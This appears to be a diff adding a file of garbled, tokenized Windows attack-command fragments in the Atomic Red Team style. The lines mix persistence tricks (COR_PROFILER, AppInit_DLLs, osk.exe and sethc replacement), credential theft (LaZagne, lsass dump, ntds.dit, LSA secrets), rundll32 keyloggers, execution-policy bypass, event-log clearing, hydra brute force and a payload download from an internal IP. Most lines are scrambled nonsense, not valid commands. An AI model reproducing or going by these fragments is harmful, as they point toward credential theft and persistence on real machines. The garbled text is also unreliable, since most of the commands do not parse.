@@ -1,0 +1,64 @@
+net localgroup `` administrators '' '' /v hklm\system\currentcontrolset\control\lsa\ powershell /v cor_profiler '' c '' appinit_dlls
+wt.exe $ '' /d 1 /f
+lazagne.exe windows
+sharprdp.exe -sn -l $ target t1547.009 nt\currentversion\windows '' -class __eventfilter '' /v cor_profiler = ' /grant windir '' c autorun $ : % \system32\osk.exe /grant administrators '' \windows\ntds\ntds.dit $ administrators '' /t $ { ip }
+net localgroup `` administrators '' '' cor_profiler '' , threadingmodel '' \windows\system32\sethc_backup.exe
+net localgroup `` : \users\ /grant # administrators '' # { cor_profiler '' ''
+conhost.exe [ hklm\security\policy\secrets % \system32\osk.exe
+reg query
+videocap.exe -t $ } -l = $ filterargs ; administrators
+rundll32 keylogger_dll_invisible.dll , keylog
+set-executionpolicy -executionpolicy bypass
+wlrmdr.exe -s $ target t1547.009 all
+bitsadmin.exe /create $ 1 /d `` userinit.exe , $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } binpath= @ '' cor_profiler /grant administrators '' -name threadingmodel '' ''
+net localgroup `` lsadbextpt '' /t reg_expand_sz -name `` cor_profiler '' -name threadingmodel '' ''
+tree
+$ `` hklm\system\currentcontrolset\control\session powershell `` cor_profiler '' enabled '' /grant 1 '' '' $ `` autorun ''
+net localgroup `` administrators '' /t cor_enable_profiling /grant cor_profiler /grant $ hklm\software\microsoft\active components\atomic_test '' -name reg_dword /d # '' /d 1 '' /d bypass
+quser
+rundll32 keylogger_dll.dll , keylog
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file \\ -gcb file c autorun $ file_name '' $ { hkey_local_machine\software\microsoft\windows c `` cor_profiler '' /t reg_sz -value 1 ''
+invoke-screencap $ `` target @ `` hklm\system\currentcontrolset\services\winsock2\parameters '' '' cor_profiler ''
+get-eventlog -list | reg http : -r '' /export '' $ `` http : \users\
+nmap -o $ : cor_profiler /grant administrators '' /grant administrators '' file /grant administrators c administrators : ' c http : file c keylog
+net localgroup `` administrators '' '' -namespace cor_profiler '' '' ''
+`` \windows\system32\desk.cpl , http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+powershell -executionpolicy bypass
+get-service
+powershell -executionpolicy bypass administrators ''
+namp -sn -l $ target t1547.009 \programdata\microsoft\windows\start -comobject ;
+net localgroup `` hklm\software\microsoft\windows nt\currentversion\image file /grant windir % localappdata % \system32\osk.exe /grant administrators : -name administrators '' c http '' /grant http : windir http http '' \system32\osk.exe /grant administrators '' -name threadingmodel /grant c '' -name cor_profiler '' /grant administrators '' c '' /grant
+commandline
+namp -sn /add
+rundll32.exe c : \windows\system32\at.exe $ `` cor_profiler '' c cor_profiler '' ''
+dir -executionpolicy , administrators : -name cor_profiler -command $ : \programdata\microsoft\windows\start windir % localappdata % \microsoft\teams\current\teams.exe
+iediagcmd.exe = [ net.webclient \\ { -classname -l $ ( clear-eventlog -r -name # _ '' c `` domain -c `` atomic nt\currentversion\winlogon\notify\atomicredteam '' '' querylanguage= '' /t threadingmodel ''
+net localgroup `` cor_profiler /grant autorun c # : cor_profiler '' /grant administrators '' ''
+systeminfo
+powershell -executionpolicy bypass ''
+net localgroup `` enabled `` host shadow user_name '' '' '' -class player ''
+silentrunner.exe $ { cor_enable_profiling -name '' '' /t threadingmodel ''
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' '' nt\currentversion\windows '' \programdata\microsoft\windows\start manager\appcertdlls '' cor_profiler file c : \windows\temp\lsass_dump.dmp
+[ /r -- foreach-object http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+python -c `` .\lazagne .. exe all
+net localgroup `` '' /v cor_profiler '' c '' /format '' '' /f in ''
+tree
+remove-item ( `` http -path c : windir localappdata % \microsoft\teams\current\teams.exe
+hydra -l $ target -c `` $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' -name cor_profiler '' -name $ ''
+net localgroup `` altitude
+hydra -l $ target domain = `` cor_profiler '' loadappinit_dlls '' ''
+rdrleakdiag.exe /p $ target t1547.009 nt\currentversion\windows '' nt\currentversion\image file file c keylog
+gobuster vhost -u $ { shadow volumn name you copy set-wmiinstance -namespace nt\currentversion\winlogon\notify\atomicredteam '' inputprovider ''
+remove-item -path `` [ localappdata ) \microsoft\teams\current\teams.exe
+tree
+copy clearing $ profile ''
+dumpminitool.exe -- file c '' c administrators '' c '' c '' c `` `` cor_enable_profiling '' '' c '' /t reg_dword /f
+net localgroup `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest
+iediagcmd.exe /out
+net localgroup `` administrators `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' '' cor_profiler ''
+bitsadmin.exe /create $ `` defaultaccount \inprocserver32 , inputprovider '' '' ''
+reg delete -- \users\ $ `` domain admins '' c `` cor_profiler '' /t reg_dword /d 1
+net localgroup `` administrators '' ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' -member administrators '' /t nt\currentversion\winlogon\notify\atomicredteam ''
+iediagcmd.exe /out
+quser
+tree
